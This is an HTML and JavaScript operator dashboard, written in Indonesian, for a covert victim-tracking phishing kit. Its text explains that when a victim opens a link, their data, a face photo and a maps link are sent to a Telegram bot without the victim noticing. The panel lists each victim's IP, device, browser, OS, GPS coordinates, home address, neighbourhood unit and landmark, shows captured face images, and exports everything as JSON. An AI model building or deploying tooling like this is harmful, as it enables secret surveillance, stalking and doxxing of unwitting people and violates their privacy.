<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Panel Admin</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:'Courier New',monospace}
        body{background:#0a0a0a;color:#00ff41;padding:10px;min-height:100vh}
        h1{text-align:center;border-bottom:2px solid #00ff41;padding-bottom:10px;margin-bottom:12px;font-size:18px;letter-spacing:2px}
        .info{background:#111;border:1px solid #00ff4133;border-radius:8px;padding:14px;margin-bottom:12px;text-align:center}
        .info .big{font-size:28px;display:block}
        .info .title{color:#00ff41;font-weight:bold;font-size:15px}
        .info .desc{color:#666;font-size:11px;margin-top:4px}
        .stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(70px,1fr));gap:5px;margin-bottom:10px}
        .stat{background:#111;padding:6px;border:1px solid #00ff4133;border-radius:4px;text-align:center}
        .stat .num{font-size:16px;font-weight:bold;color:#00ff41}
        .stat .label{font-size:8px;color:#666;text-transform:uppercase}
        .controls{display:flex;gap:5px;flex-wrap:wrap;margin-bottom:10px}
        .btn{padding:5px 12px;background:transparent;border:1px solid #00ff41;color:#00ff41;border-radius:4px;cursor:pointer;font-size:10px;text-transform:uppercase}
        .btn:hover{background:#00ff41;color:#000}
        .btn-danger{border-color:#ff3b3b;color:#ff3b3b}
        .btn-danger:hover{background:#ff3b3b;color:#000}
        .entry{background:#111;border:1px solid #00ff4122;border-radius:4px;padding:8px;margin-bottom:6px}
        .entry .head{display:flex;justify-content:space-between;flex-wrap:wrap;gap:3px;font-size:11px}
        .entry .head .time{color:#666;font-size:9px}
        .entry .detail{font-size:10px;color:#b0ffb0;margin-top:3px;line-height:1.6}
        .entry .detail .rt{color:#ffd54f;font-weight:bold}
        .entry .detail .landmark{color:#ffaa00}
        .entry .detail .coord{color:#81d4fa}
        .face-section{margin-top:4px;padding:4px 6px;background:#0d0d0d;border:1px solid #ff3b3b44;border-radius:4px;display:flex;align-items:center;gap:8px;flex-wrap:wrap;cursor:pointer}
        .face-section:hover{border-color:#ff3b3b88}
        .face-section img{max-width:60px;max-height:60px;border-radius:4px;border:1px solid #ff3b3b66}
        .badge{display:inline-block;padding:1px 6px;border-radius:10px;font-size:8px;font-weight:bold;margin-left:2px}
        .badge.hp{background:#1a3a1a;color:#00ff41;border:1px solid #00ff4144}
        .badge.laptop{background:#1a1a3a;color:#4488ff;border:1px solid #4488ff44}
        .badge.face{background:#3a1a1a;color:#ff3b3b;border:1px solid #ff3b3b44}
        .empty{color:#555;text-align:center;padding:20px;font-size:13px}
        .modal-overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.92);z-index:9999;justify-content:center;align-items:center;padding:16px}
        .modal-overlay.active{display:flex}
        .modal-box{background:#111;border-radius:16px;max-width:500px;width:100%;padding:20px;border:1px solid #00ff4133;max-height:90vh;overflow-y:auto}
        .modal-box img{width:100%;border-radius:8px;border:2px solid #2a4a2a;max-height:350px;object-fit:contain}
        .modal-box .close-btn{text-align:center;margin-top:12px;color:#666;font-size:12px;cursor:pointer;padding:8px;border:1px solid #222;border-radius:8px}
        .modal-box .close-btn:hover{background:#1a1a1a;color:#00ff41}
        .modal-box .detail-row{display:flex;justify-content:space-between;padding:3px 0;border-bottom:1px solid #1a1a1a;font-size:11px}
        .modal-box .detail-row .label{color:#666}
        .modal-box .detail-row .value{color:#b0ffb0;text-align:right;max-width:60%;word-break:break-word}
        .modal-box .detail-row .value.rt{color:#ffd54f;font-weight:bold}
        .modal-box .detail-row .value.landmark{color:#ffaa00}
        .modal-box .detail-row .value.coord{color:#81d4fa}
        .modal-box .maps-link{color:#81d4fa;text-decoration:none}
    </style>
</head>
<body>
    <h1>🕵️ PANEL ADMIN</h1>

    <div class="info">
        <span class="big">🤖</span>
        <div class="title">Data Langsung ke Telegram</div>
        <div class="desc">Korban buka web → data + foto wajah + link maps langsung masuk ke bot Telegram</div>
        <div style="color:#3a5a3a;font-size:10px;margin-top:4px;">📌 Korban tidak melihat apa-apa, semuanya berjalan di belakang layar</div>
    </div>

    <div class="stats" id="stats"></div>

    <div class="controls">
        <button class="btn" onclick="refreshData()">🔄 Refresh</button>
        <button class="btn btn-danger" onclick="hapusSemua()">🗑️ Hapus Lokal</button>
        <button class="btn" onclick="exportJSON()">📥 JSON</button>
    </div>

    <div id="dataContainer"></div>

    <div class="modal-overlay" id="faceZoomModal" onclick="if(event.target===this)closeZoom()">
        <div class="modal-box">
            <h3 style="color:#00ff41;font-weight:300;text-align:center;margin-bottom:10px;">📸 Detail Korban</h3>
            <img id="zoomFaceImg" src="" alt="Face">
            <div id="zoomDetail" style="margin-top:10px;"></div>
            <div class="close-btn" onclick="closeZoom()">✕ TUTUP</div>
        </div>
    </div>

    <script>
        function getData() {
            try { return JSON.parse(localStorage.getItem('data_korban') || '[]'); }
            catch { return []; }
        }

        function renderStats(data) {
            const total = data.length;
            const today = new Date().toDateString();
            const todayCount = data.filter(d => new Date(d.timestamp).toDateString() === today).length;
            const hp = data.filter(d => d.device && d.device.includes('HP')).length;
            const withFace = data.filter(d => d.face && d.face.includes('Terdeteksi')).length;

            document.getElementById('stats').innerHTML = `
                <div class="stat"><div class="num">${total}</div><div class="label">Total</div></div>
                <div class="stat"><div class="num">${todayCount}</div><div class="label">Hari Ini</div></div>
                <div class="stat"><div class="num">${hp}</div><div class="label">HP</div></div>
                <div class="stat"><div class="num">${withFace}</div><div class="label">Wajah</div></div>
            `;
        }

        function renderData() {
            const data = getData();
            const container = document.getElementById('dataContainer');
            renderStats(data);

            if (data.length === 0) {
                container.innerHTML = '<div class="empty">Belum ada data. Kirim link ke target.</div>';
                return;
            }

            let html = '';
            const reversed = [...data].reverse();
            reversed.forEach((d, idx) => {
                const deviceClass = d.device && d.device.includes('HP') ? 'hp' : 'laptop';
                const hasFace = d.face && d.face.includes('Terdeteksi') && d.faceImage;
                const mapsLink = (d.lat && d.lon) ? `https://www.google.com/maps?q=${d.lat},${d.lon}` : '';

                html += `
                <div class="entry">
                    <div class="head">
                        <div>
                            <span class="badge ${deviceClass}">${d.device || '?'}</span>
                            ${hasFace ? '<span class="badge face">📸 WAJAH</span>' : ''}
                            <span style="color:#888;font-size:10px;">${d.alamat || d.lokasi || '-'}</span>
                        </div>
                        <div class="time">${d.waktu || new Date(d.timestamp).toLocaleString()}</div>
                    </div>

                    <div class="detail">
                        ${d.rt_rw && d.rt_rw !== '-' ? `<span class="rt">🏘️ ${d.rt_rw}</span>` : ''}
                        ${d.landmark && d.landmark !== '-' ? ` · <span class="landmark">📍 ${d.landmark}</span>` : ''}
                        ${d.lat && d.lon ? ` · <span class="coord">🌍 ${d.lat.toFixed(6)}, ${d.lon.toFixed(6)}</span>` : ''}
                        ${mapsLink ? ` · <a href="${mapsLink}" target="_blank" class="maps-link">🗺️ Maps</a>` : ''}
                        <br>
                        ${d.ip ? `📶 IP: ${d.ip}` : ''}
                        ${d.browser ? ` · 🌐 ${d.browser}` : ''}
                        ${d.os ? ` · 💻 ${d.os}` : ''}
                        <br>
                        ${d.face ? `📸 Wajah: ${d.face}` : ''}
                    </div>

                    ${hasFace ? `
                    <div class="face-section" onclick="openZoom('${d.faceImage}', '${d.alamat || d.lokasi || '-'}', '${d.rt_rw || '-'}', '${d.landmark || '-'}', '${d.lat || '-'}', '${d.lon || '-'}', '${d.ip || '-'}', '${d.device || '-'}', '${d.browser || '-'}', '${d.os || '-'}')">
                        <img src="${d.faceImage}" alt="Face">
                        <div class="info" style="font-size:9px;color:#ff8888;">
                            📸 Wajah terekam<br>
                            <span style="color:#666;font-size:8px;">Klik untuk zoom</span>
                        </div>
                    </div>
                    ` : ''}
                </div>
                `;
            });
            container.innerHTML = html;
        }

        function openZoom(faceImg, alamat, rtRw, landmark, lat, lon, ip, device, browser, os) {
            const mapsLink = (lat && lon && lat !== '-' && lon !== '-') ? `https://www.google.com/maps?q=${lat},${lon}` : '';
            document.getElementById('zoomFaceImg').src = faceImg;
            document.getElementById('zoomDetail').innerHTML = `
                <div class="detail-row"><span class="label">🏠 Alamat</span><span class="value">${alamat || '-'}</span></div>
                <div class="detail-row"><span class="label">🏘️ RT/RW</span><span class="value rt">${rtRw || '-'}</span></div>
                <div class="detail-row"><span class="label">📍 Patokan</span><span class="value landmark">${landmark || '-'}</span></div>
                <div class="detail-row"><span class="label">🌍 Koordinat</span><span class="value coord">${lat || '-'}, ${lon || '-'}</span></div>
                ${mapsLink ? `<div class="detail-row"><span class="label">🗺️ Maps</span><span class="value"><a href="${mapsLink}" target="_blank" class="maps-link">🔗 Klik lihat</a></span></div>` : ''}
                <div class="detail-row"><span class="label">📶 IP</span><span class="value">${ip || '-'}</span></div>
                <div class="detail-row"><span class="label">📱 Perangkat</span><span class="value">${device || '-'}</span></div>
                <div class="detail-row"><span class="label">🌐 Browser</span><span class="value">${browser || '-'}</span></div>
                <div class="detail-row"><span class="label">💻 OS</span><span class="value">${os || '-'}</span></div>
            `;
            document.getElementById('faceZoomModal').classList.add('active');
        }

        function closeZoom() {
            document.getElementById('faceZoomModal').classList.remove('active');
        }

        function refreshData() { renderData(); }

        function hapusSemua() {
            if (confirm('Hapus semua data lokal?')) {
                localStorage.removeItem('data_korban');
                renderData();
            }
        }

        function exportJSON() {
            const data = getData();
            const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `data_${new Date().toISOString().slice(0,10)}.json`;
            a.click();
            URL.revokeObjectURL(url);
        }

        setInterval(renderData, 3000);
        renderData();
    </script>
</body>
</html>
